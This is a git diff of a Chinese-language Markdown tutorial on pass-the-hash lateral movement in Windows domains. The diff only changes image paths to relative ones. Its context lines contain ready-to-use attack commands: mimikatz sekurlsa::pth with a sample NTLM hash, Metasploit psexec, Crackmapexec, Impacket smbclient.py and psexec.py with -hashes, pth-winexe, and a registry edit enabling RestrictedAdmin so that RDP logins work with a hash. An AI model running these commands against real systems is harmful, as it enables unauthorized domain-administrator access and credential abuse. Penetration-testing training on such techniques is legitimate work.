@@ -28,7 +28,7 @@ sekurlsa::pth /user:administrator /domain:no0b.net /ntlm:b0093b0887bf1b515a90cf1
 ```
 可以直接开启一个域管的cmd，如下图
 
-![mimikatz_pth_cmd](D:\md\PTH的利用\mimikatz_pth_cmd.png)
+![mimikatz_pth_cmd](.\mimikatz_pth_cmd.png)
 
 ### metasploit
 metasploit在域控机器上执行
@@ -49,7 +49,7 @@ msf5 exploit(windows/smb/psexec) > exploit
 ```
 这样就可以获得一个shell，执行sysinfo可以看到信息，如下
 
-![msf_psexec_shell](D:\md\PTH的利用\msf_psexec_shell.png)
+![msf_psexec_shell](.\msf_psexec_shell.png)
 
 除此之外，metasploit还有smb_login等模块不同协议可以利用PTH。
 
@@ -60,7 +60,7 @@ Crackmapexec这个工具可以在kali上直接安装`apt-get install Crackmapexe
 
 ![msf_psexec_shell](D:\md\PTH的利用\msf_psexec_shell.png
 
-![Crackmapexec_smb](D:\md\PTH的利用\Crackmapexec_smb.png)
+![Crackmapexec_smb](.\Crackmapexec_smb.png)
 
 Crackmapexec这个工具不止这些用法，日后可以单独写一篇使用技巧。
 ### Impacket
@@ -70,22 +70,22 @@ smbclient.py的命令是`python3 smbclient.py -hashes 00000000000000000000000000
 
 执行效果如下图
 
-![impacket_smb](D:\md\PTH的利用\impacket_smb.png)
+![impacket_smb](.\impacket_smb.png)
 
 psexec.py的命令是`python psexec.py -hashes 00000000000000000000000000000000:ntlm-hash domain/Administrator@ip`
 
 执行效果如下图
 
-![impacket_psexec](D:\md\PTH的利用\impacket_psexec.png)
+![impacket_psexec](.\impacket_psexec.png)
 
 ### kali PTH工具包
 kali本身也是自带PTH攻击的工具包的，功能不少。
-![kali-PTH](D:\md\PTH的利用\kali-PTH.png)
+![kali-PTH](.\kali-PTH.png)
 
 以使用pth-winexe来进行PTH攻击。
 命令是`pth-winexe -U domain/Administrator%00000000000000000000000000000000:ntlm-hash //ip cmd`
 
-![pth-winexe](D:\md\PTH的利用\pth-winexe.png)
+![pth-winexe](.\pth-winexe.png)
 
 
 ### pth-RDP
@@ -94,16 +94,16 @@ pth攻击的利用还可以用来远程桌面登录。
 mimikatz的命令是`sekurlsa::pth /user:administrator /domain:no0b.net /ntlm:b0093b0887bf1b515a90cf123bce7fba "/run:mstsc.exe /restrictedadmin"
 `
 
-![mimikatz_pth_rdp](D:\md\PTH的利用\mimikatz_pth_rdp.png)
+![mimikatz_pth_rdp](.\mimikatz_pth_rdp.png)
 
 值得注意的是这里需要远程桌面开启restrictedadmin模式。开启的命令是
 `REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
 `
 同时这个模式对RDP的版本也有要求，最低未8.1。目前win8/winserver2012R2及以上的版本都是高于8.1的，只需要改注册表就可以打开。
 但是本次使用的win7就需要安装一系列补丁从而升级到rdp8.1版本。(查看rdp版本可以打开rdp的窗口后右键查看关于)
-![RDP_about](D:\md\PTH的利用\RDP_about.png)
+![RDP_about](.\RDP_about.png)
 对于win7 sp1升级到RDP8.1，以下安装的补丁仅供参考。
-![win7sp1_to_rdp8.1](D:\md\PTH的利用\win7sp1_to_rdp8.1.png)
+![win7sp1_to_rdp8.1](.\win7sp1_to_rdp8.1.png)
 
 ## 参考链接
 https://www.4hou.com/posts/DPqY （原文链接：https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/）
